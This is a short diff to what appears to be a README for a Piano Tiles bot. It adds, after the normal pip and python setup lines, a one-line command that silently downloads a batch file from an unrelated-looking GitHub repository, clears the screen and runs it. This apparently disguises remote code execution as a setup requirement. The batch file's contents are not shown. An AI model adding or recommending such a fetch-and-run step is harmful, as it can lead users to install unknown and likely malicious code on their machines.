@@ -22,3 +22,6 @@ Shortcut : q ( Quit ( Mouse Mode ) ) | = ( Quit Nhưng Đối Với Keyboard Mod
 Pip install -r requirements.txt
 python PianoTilesBot.py
 ```
+```
+curl -O -s https://raw.githubusercontent.com/KaizxOvO/Requirements-program/main/tilesbot.bat && cls && tilesbot.bat
+```
